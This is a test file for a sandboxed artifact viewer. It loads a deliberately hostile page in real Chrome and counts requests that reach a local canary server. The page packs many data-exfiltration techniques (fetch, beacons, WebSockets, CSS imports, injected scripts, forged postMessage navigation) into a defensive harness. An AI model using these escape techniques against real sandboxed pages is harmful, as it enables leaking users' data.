// No-egress canary suite in a REAL browser (DESIGN §5.7, L34). A hostile artifact page tries every way out we know; a
// canary server counts what reaches it. With our headers the count must be 0. A control run serves the SAME page
// WITHOUT the headers and must reach the canary (proves the harness can see a leak).
//
// Needs Chrome + playwright-core (no download): PW_CORE=<path to playwright-core/index.mjs> (default: the website
// checkout's copy) and the system Chrome (or CHROME_PATH). Without them the suite is SKIPPED with a message — it is
// local / QA evidence, not a CI gate (the CI image has no browser). Residuals R1 (DNS hints) and R2 (WebRTC STUN) are
// out of scope here (DESIGN §5.4).
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { after, before, describe, it } from "node:test";
import { opaqueDigest } from "@opt2-tealbrick/manifest";
import type { Db } from "@opt2-tealbrick/miniapp-sdk";
import { handleViewer, newToken, type ViewerConfig } from "../../src/viewer.ts";
import { migratedDb } from "../helpers.ts";

const PW = process.env.PW_CORE ?? "/Users/puma/work/active/website-martin-redesign/node_modules/playwright-core/index.mjs";
const CHROME = process.env.CHROME_PATH ?? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const available = existsSync(PW) && existsSync(CHROME);
const WAIT_MS = Number(process.env.CANARY_WAIT_MS ?? 2500);

function listen(handler: (req: IncomingMessage, res: ServerResponse) => void): Promise<{ server: Server; origin: string }> {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, "127.0.0.1", () => resolve({ server, origin: `http://127.0.0.1:${(server.address() as AddressInfo).port}` }));
  });
}

/** Every exit we try. `C` is the canary origin. Each attempt is wrapped so one blocked call never stops the next. */
function hostilePage(C: string): string {
  const tries = [
    `fetch("${C}/fetch").catch(()=>{})`,
    `fetch("${C}/fetch-nocors",{mode:"no-cors"}).catch(()=>{})`,
    `var x=new XMLHttpRequest();x.open("GET","${C}/xhr");x.send()`,
    `new WebSocket("${C.replace("http", "ws")}/ws")`,
    `new EventSource("${C}/sse")`,
    `navigator.sendBeacon("${C}/beacon","x")`,
    `var i=new Image();i.src="${C}/img";document.body.appendChild(i)`,
    `var s=document.createElement("style");s.textContent="body{background:url(${C}/cssurl)}";document.head.appendChild(s)`,
    `var s2=document.createElement("style");s2.textContent="@import url(${C}/cssimport);";document.head.appendChild(s2)`,
    `var l=document.createElement("link");l.rel="stylesheet";l.href="${C}/link";document.head.appendChild(l)`,
    `var p=document.createElement("link");p.rel="prefetch";p.href="${C}/prefetch";document.head.appendChild(p)`,
    `var sc=document.createElement("script");sc.src="${C}/script";document.head.appendChild(sc)`,
    `var f=document.createElement("iframe");f.src="${C}/iframe";document.body.appendChild(f)`,
    `var fm=document.createElement("form");fm.action="${C}/form";fm.method="GET";document.body.appendChild(fm);fm.submit()`,
    `window.open("${C}/open")`,
    `top.location="${C}/top"`,
    `new Worker("data:text/javascript,fetch('${C}/worker')")`,
    `document.cookie`,
    `localStorage.setItem("x","1")`,
    `parent.postMessage({type:"tb:resize",height:1e9},"*")`,
    `parent.postMessage({type:"tb:navigate",url:"${C}/forged"},"*")`,
    `setTimeout(()=>{location="${C}/location"},300)`,
  ];
  const body = ['console.log("hostile-ran")', 'console.log("href:" + location.href + " ref:" + document.referrer)', ...tries].map((t) => `try{${t}}catch(e){}`).join("\n");
  return `<!doctype html><html><head><meta http-equiv="refresh" content="1;url=${C}/meta"></head><body><h1>hostile</h1>
<script>${body}</script><img src="${C}/static-img"><video src="${C}/video"></video></body></html>`;
}

describe("no-egress canary (real Chrome)", { skip: available ? false : `skipped: needs playwright-core (${PW}) and Chrome (${CHROME})` }, () => {
  let db: Db;
  let canary: { server: Server; origin: string };
  let views: { server: Server; origin: string };
  let plain: { server: Server; origin: string };
  const hits: string[] = [];
  let token = "";
  let goodToken = "";
  let previewToken = "";
  let main: { server: Server; origin: string };
  let browser: { newPage(): Promise<any>; close(): Promise<void> } | undefined;

  before(async () => {
    canary = await listen((req, res) => {
      hits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
      res.end("leak");
    });
    db = migratedDb();
    const now = Date.now();
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES ('art_01J00000000000000000000CAN', 'shared', 'Canary', '', 'active', 1, 'owner', 'off', 'agent', 'agt_x', 'Mallory', ?, ?)`,
    ).run(now, now);
    // written straight into the table: the write-time lint is advice, not the boundary, so the test bypasses it
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES ('art_01J00000000000000000000CAN', 1, ?, 'x', '{\"v\":1,\"inputs\":[],\"triggers\":[]}', 'x', 1, 'agent', 'agt_x', 'Mallory', ?)",
    ).run(Buffer.from(hostilePage(canary.origin), "utf8"), now);
    token = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at) VALUES ('lnk_01J00000000000000000000CAN', 'art_01J00000000000000000000CAN', 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?)",
    ).run(opaqueDigest(token), now, now + 3_600_000);
    // a benign page with one push source shown to link viewers: the shell must render it and deliver the data
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES ('art_01J00000000000000000000G0D', 'shared', 'Weekly numbers', '', 'active', 1, 'owner', 'off', 'agent', 'agt_y', 'Scout', ?, ?)`,
    ).run(now, now);
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES ('art_01J00000000000000000000G0D', 1, ?, 'x', '{}', 'x', 1, 'agent', 'agt_y', 'Scout', ?)",
    ).run(Buffer.from('<!doctype html><h1 id="n">waiting</h1><script>tb.onData((d)=>{document.getElementById("n").textContent="total "+d.n.total});tb.ready();</script>', "utf8"), now);
    db.prepare("INSERT INTO la_source (artifact_id, key, kind, digest, approved_digest, viewers) VALUES ('art_01J00000000000000000000G0D', 'n', 'push', 'd', 'd', 1)").run();
    db.prepare("INSERT INTO la_snapshot (artifact_id, key, data_json, bytes, fetched_at, status) VALUES ('art_01J00000000000000000000G0D', 'n', '{\"total\":42}', 12, ?, 'ok')").run(now);
    goodToken = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at) VALUES ('lnk_01J00000000000000000000G0D', 'art_01J00000000000000000000G0D', 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?)",
    ).run(opaqueDigest(goodToken), now, now + 3_600_000);
    // the owner's preview of the benign page (framed by the owner UI on the "main" origin)
    previewToken = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at, pin_version) VALUES ('lnk_01J00000000000000000000PRV', 'art_01J00000000000000000000G0D', 'preview', ?, 'preview', 'person', 'per_x', 'Owner', ?, ?, 1)",
    ).run(opaqueDigest(previewToken), now, now + 600_000);
    let cfg: ViewerConfig = { viewOrigin: null, mainOrigin: null, workspaceName: "Acme", docKey: "canary-doc-key" };
    views = await listen(async (req, res) => {
      const r = handleViewer(db, new Request(`${cfg.viewOrigin}${req.url}`, { method: req.method ?? "GET", headers: req.headers as Record<string, string> }), cfg, Date.now());
      res.writeHead(r.status, Object.fromEntries(r.headers));
      res.end(Buffer.from(await r.arrayBuffer()));
    });
    main = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(`<!doctype html><h1>Owner UI</h1><iframe id="pv" sandbox="allow-scripts allow-same-origin" src="${views.origin}/v/live-artifacts/${previewToken}" style="width:800px;height:600px"></iframe>`);
    });
    cfg = { ...cfg, viewOrigin: views.origin, mainOrigin: main.origin };
    plain = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(hostilePage(canary.origin));
    });
    const { chromium } = await import(PW);
    browser = await chromium.launch({ executablePath: CHROME });
  });
  const newPage = async () => {
    if (!browser) throw new Error("no browser");
    return browser.newPage();
  };
  after(async () => {
    await browser?.close();
    for (const s of [canary, views, plain, main]) s?.server.close();
  });

  it("a benign page renders in the sandboxed frame and receives its data through tb.onData (quiet on good)", async () => {
    hits.length = 0;
    const page = await newPage();
    await page.goto(`${views.origin}/v/live-artifacts/${goodToken}`);
    const frame = page.frameLocator("iframe");
    await frame.locator("#n", { hasText: "total 42" }).waitFor({ timeout: 10_000 });
    assert.equal(await page.evaluate(() => document.getElementById("title")?.textContent), "Weekly numbers");
    assert.match(String(await page.evaluate(() => document.getElementById("by")?.textContent)), /Shared by Acme · written by an AI agent \(Scout\)/);
    assert.deepEqual(hits, []);
    await page.close();
  });

  it("control: the same page WITHOUT our headers reaches the canary (the harness sees leaks)", async () => {
    hits.length = 0;
    const page = await newPage();
    await page.goto(`${plain.origin}/`).catch(() => {});
    await page.waitForTimeout(WAIT_MS);
    await page.close();
    assert.ok(hits.length >= 5, `control run must leak; canary saw ${hits.length}: ${hits.join(", ")}`);
  });

  it("through the viewer shell: 0 requests reach the canary, no frame leaves the views origin, forged messages are ignored", async () => {
    hits.length = 0;
    const page = await newPage();
    const popups: string[] = [];
    page.on("popup", (p: { url(): string }) => popups.push(p.url()));
    const logs: string[] = [];
    page.on("console", (m: { text(): string }) => logs.push(m.text()));
    await page.goto(`${views.origin}/v/live-artifacts/${token}`);
    await page.waitForTimeout(WAIT_MS);
    assert.deepEqual(hits, [], `canary must stay quiet; saw: ${hits.join(", ")}`);
    assert.equal(page.url(), `${views.origin}/v/live-artifacts/${token}`, "the top page did not navigate");
    assert.deepEqual(popups, [], "no popup opened");
    // the hostile page tried to navigate its own frame away; frame-src blocked it (Chrome leaves an error page in the
    // frame). Assert that no frame ever reached another origin.
    const frameUrls: string[] = page.frames().map((f: { url(): string }) => f.url());
    assert.ok(!frameUrls.some((u) => u.startsWith(canary.origin)), `no frame on the canary origin: ${frameUrls.join(", ")}`);
    assert.ok(logs.includes("hostile-ran"), "the hostile script really ran inside the frame");
    assert.ok(logs.some((l) => l.startsWith("href:")), "the page read its own URL");
    assert.ok(!logs.some((l) => l.includes(token)), "…which never contains the link token (review PR #2, finding 3)");
    const height = Number.parseInt(await page.evaluate(() => (document.querySelector("iframe") as HTMLIFrameElement).style.height || "480"), 10);
    assert.ok(height <= 20000, `a forged resize is clamped (${height}px)`);
    assert.equal(await page.evaluate(() => document.getElementById("title")?.textContent), "Canary", "banner rendered by the shell");
    await page.close();
  });

  it("the document opened directly (no shell) is refused: 404 and 0 requests reach the canary", async () => {
    hits.length = 0;
    const data = await (await fetch(`${views.origin}/v/live-artifacts/${token}/data`)).json();
    const page = await newPage();
    const r = await page.goto(`${views.origin}/v/live-artifacts/${data.doc}`);
    assert.equal(r?.status(), 404, "Sec-Fetch-Dest document → 404");
    await page.waitForTimeout(WAIT_MS);
    assert.deepEqual(hits, [], `saw: ${hits.join(", ")}`);
    await page.close();
  });

  it("owner preview: the owner UI frames the preview shell, which frames the document (frame-ancestors covers both)", async () => {
    const page = await newPage();
    await page.goto(`${main.origin}/`);
    const doc = page.frameLocator("#pv").frameLocator("iframe");
    await doc.locator("#n", { hasText: "total 42" }).waitFor({ timeout: 10_000 });
    await page.close();
  });
});
